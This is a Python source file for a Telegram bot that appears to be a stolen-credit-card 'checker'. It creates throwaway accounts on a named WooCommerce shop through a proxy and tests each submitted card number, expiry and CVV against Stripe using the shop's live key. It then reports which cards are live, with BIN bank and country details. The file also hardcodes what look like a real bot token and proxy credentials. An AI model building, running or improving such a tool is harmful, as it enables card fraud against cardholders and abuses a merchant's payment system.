import time
import requests
from bs4 import BeautifulSoup
from aiogram import Bot, Dispatcher, types, executor
import html

# === CONFIGURATION ===
BOT_TOKEN = '7390503914:AAFNopMlX6iNHO2HTWNYpLLzE_DfF8h4uQ4'   # <-- Your Telegram bot token here!
PROXY = "socks5://PP_D4F1YGPKC1-country-US-state-Newyork-session-tMJaETm8HSRJ:omf4xz27@evo-pro.porterproxies.com:61236/"  # <-- Your proxy string

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

def escape_html(text):
    """Escapes HTML special characters for Telegram."""
    return html.escape(str(text), quote=False)

def format_stripe_ui(card, gateway, status, response, bank, country, info, bin_code, elapsed, checked_by):
    return (
        "🔍 <b>STRIPE AUTH</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <b>Card:</b> <code>{escape_html(card)}</code>\n"
        f"🚪 <b>Gateway:</b> {escape_html(gateway)}\n"
        f"🕵️ <b>Status:</b> {escape_html(status)}\n"
        f"💬 <b>Response:</b> {escape_html(response)}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🏦 <b>Bank:</b> {escape_html(bank)}\n"
        f"🌍 <b>Country:</b> {escape_html(country)}\n"
        f"💡 <b>Info:</b> {escape_html(info)}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>BIN:</b> {escape_html(bin_code)}\n"
        f"⏱️ <b>Time:</b> {escape_html(elapsed)} 💨\n"
        f"👤 <b>Checked By:</b> {escape_html(checked_by)}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "👨‍💻 <b>Dev:</b> 👾 𝗕𝗨𝗡𝗡𝗬 🚀"
    )

def bin_lookup(bin_number):
    try:
        session = requests.Session()
        session.proxies.update({
            "http": PROXY,
            "https": PROXY
        })
        r = session.get(f"https://api.voidex.dev/api/bin?bin={bin_number}", timeout=10)
        data = r.json()
        return {
            'bank': data.get("bank", "N/A"),
            'country': f"{data.get('flag', '')} {data.get('country_name', 'N/A')}",
            'info': f"{data.get('vendor', 'N/A')} {data.get('type', '')}".strip()
        }
    except Exception:
        return {
            'bank': 'N/A',
            'country': 'N/A',
            'info': 'N/A'
        }

def process_card(card_input):
    try:
        cc, mes, ano, cvv = card_input.split("|")
        if len(cc) < 13 or len(cc) > 19 or not cc.isdigit():
            return {"status": "INVALID", "response": "Card format invalid."}
        if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
            return {"status": "INVALID", "response": "Month invalid."}
        if not ano.isdigit() or len(ano) not in [2, 4]:
            return {"status": "INVALID", "response": "Year invalid."}
        if len(ano) == 4:
            ano = ano[2:]
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return {"status": "INVALID", "response": "CVV invalid."}
    except Exception:
        return {"status": "INVALID", "response": "Card format invalid."}

    try:
        session = requests.Session()
        session.proxies.update({
            "http": PROXY,
            "https": PROXY
        })

        random_user_url = "https://randomuser.me/api/?results=1&nat=US"
        random_user_response = session.get(random_user_url)
        user_info = random_user_response.json()["results"][0]
        email = user_info["email"]
        zipcode = user_info["location"]["postcode"]

        url = "https://www.scandictech.no/my-account/"
        data = {
            "email": email,
            "woocommerce-register-nonce": "aef6c11c3b",
            "_wp_http_referer": "/my-account/",
            "register": "Register"
        }
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        try:
            post_response = session.post(url, data=data, headers=headers)
        except requests.exceptions.RequestException:
            return {"status": "DECLINED ❌", "response": "Registration connection error."}

        add_payment_method_url = "https://www.scandictech.no/my-account/add-payment-method/"
        try:
            response = session.get(add_payment_method_url, headers=headers)
        except requests.exceptions.RequestException:
            return {"status": "DECLINED ❌", "response": "Payment method page error."}

        nonce = None
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            scripts = soup.find_all("script")
            for script in scripts:
                if script.string and "createAndConfirmSetupIntentNonce" in script.string:
                    start = script.string.find("createAndConfirmSetupIntentNonce") + len("createAndConfirmSetupIntentNonce") + 3
                    end = script.string.find('"', start)
                    nonce = script.string[start:end]
                    break

        stripe_url = "https://m.stripe.com/6"
        try:
            stripe_response = session.post(stripe_url, data={}, headers=headers)
            stripe_json = stripe_response.json()
        except Exception:
            return {"status": "DECLINED ❌", "response": "Stripe session error."}
        guid = stripe_json.get("guid", "")
        muid = stripe_json.get("muid", "")
        sid = stripe_json.get("sid", "")

        payment_methods_url = "https://api.stripe.com/v1/payment_methods"
        payment_methods_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": ano,
            "card[exp_month]": mes,
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": zipcode,
            "billing_details[address][country]": "US",
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": "pk_live_51CAQ12Ch1v99O5ajYxDe9RHvH4v7hfoutP2lmkpkGOwx5btDAO6HDrYStP95KmqkxZro2cUJs85TtFsTtB75aV2G00F87TR6yf",
            "_stripe_version": "2024-06-20",
        }
        try:
            payment_methods_response = session.post(payment_methods_url, data=payment_methods_data, headers=headers)
            payment_methods_json = payment_methods_response.json()
            payment_method_id = payment_methods_json.get("id", "")
        except Exception:
            return {"status": "DECLINED ❌", "response": "Stripe payment method error."}

        confirm_setup_intent_url = "https://www.scandictech.no/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
        confirm_setup_intent_data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": payment_method_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce
        }
        try:
            confirm_setup_intent_response = session.post(confirm_setup_intent_url, data=confirm_setup_intent_data, headers=headers)
            response_json = confirm_setup_intent_response.json()
        except Exception:
            return {"status": "DECLINED ❌", "response": "Stripe confirm setup error."}

        if response_json.get("success") is False:
            error_message = response_json.get("data", {}).get("error", {}).get("message", "Unknown error")
            lower_error = error_message.lower()
            if "insufficient_funds" in lower_error:
                return {"status": "INSUFFICIENT FUNDS ❗", "response": error_message}
            if "authentication required" in lower_error or "3d secure" in lower_error or "3d" in lower_error:
                return {"status": "3D SECURE REQUIRED 🔐", "response": error_message}
            if "incorrect_address" in lower_error:
                return {"status": "INCORRECT ADDRESS ⚠️", "response": error_message}
            if "incorrect_cvc" in lower_error:
                return {"status": "INCORRECT CVC ⚠️", "response": error_message}
            return {"status": "DECLINED ❌", "response": error_message}
        elif response_json.get("success") is True:
            data = response_json.get("data", {})
            status = data.get("status", "unknown")
            if status == "requires_action":
                return {"status": "3D SECURE REQUIRED 🔐", "response": status}
            else:
                return {"status": "APPROVED ✅", "response": status}
        else:
            return {"status": "DECLINED ❌", "response": "Unknown error."}
    except Exception as e:
        return {"status": "DECLINED ❌", "response": f"Unknown exception: {e}"}

@dp.message_handler(commands=["start"])
async def start_cmd(message: types.Message):
    await message.reply(
        "Welcome!\n"
        "Send a card in this format:\n"
        "<code>5357781234560000|01|25|123</code>\n"
        "Or use /check <card> to check.\n"
        "The bot will reply with Stripe Auth status, BIN lookup, and details.",
        parse_mode="HTML"
    )

@dp.message_handler(commands=["check"])
async def check_cmd(message: types.Message):
    args = message.get_args().strip()
    if "|" not in args:
        await message.reply("Send a card in this format: 5357781234560000|01|25|123")
        return
    card = args
    try:
        parts = card.split("|")
        if len(parts) != 4 or not all(parts):
            raise ValueError
        bin_number = parts[0][:6]
    except Exception:
        await message.reply("Invalid card format!\nFormat: <code>5357781234560000|01|25|123</code>", parse_mode="HTML")
        return

    t0 = time.time()
    result = process_card(card)
    status = result.get("status", "DECLINED ❌")
    resp = result.get("response", "Unknown.")

    bin_data = bin_lookup(bin_number)
    elapsed = "%.2fs" % (time.time() - t0)
    ui = format_stripe_ui(
        card=card,
        gateway="Stripe Auth",
        status=status,
        response=resp,
        bank=bin_data['bank'],
        country=bin_data['country'],
        info=bin_data['info'],
        bin_code=bin_number,
        elapsed=elapsed,
        checked_by=message.from_user.first_name
    )
    await message.reply(ui, parse_mode="HTML")

@dp.message_handler(lambda m: "|" in m.text)
async def card_msg(message: types.Message):
    card = message.text.strip().replace(" ", "")
    try:
        parts = card.split("|")
        if len(parts) != 4 or not all(parts):
            raise ValueError
        bin_number = parts[0][:6]
    except Exception:
        await message.reply("Invalid card format!\nFormat: <code>5357781234560000|01|25|123</code>", parse_mode="HTML")
        return

    t0 = time.time()
    result = process_card(card)
    status = result.get("status", "DECLINED ❌")
    resp = result.get("response", "Unknown.")

    bin_data = bin_lookup(bin_number)
    elapsed = "%.2fs" % (time.time() - t0)
    ui = format_stripe_ui(
        card=card,
        gateway="Stripe Auth",
        status=status,
        response=resp,
        bank=bin_data['bank'],
        country=bin_data['country'],
        info=bin_data['info'],
        bin_code=bin_number,
        elapsed=elapsed,
        checked_by=message.from_user.first_name
    )
    await message.reply(ui, parse_mode="HTML")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
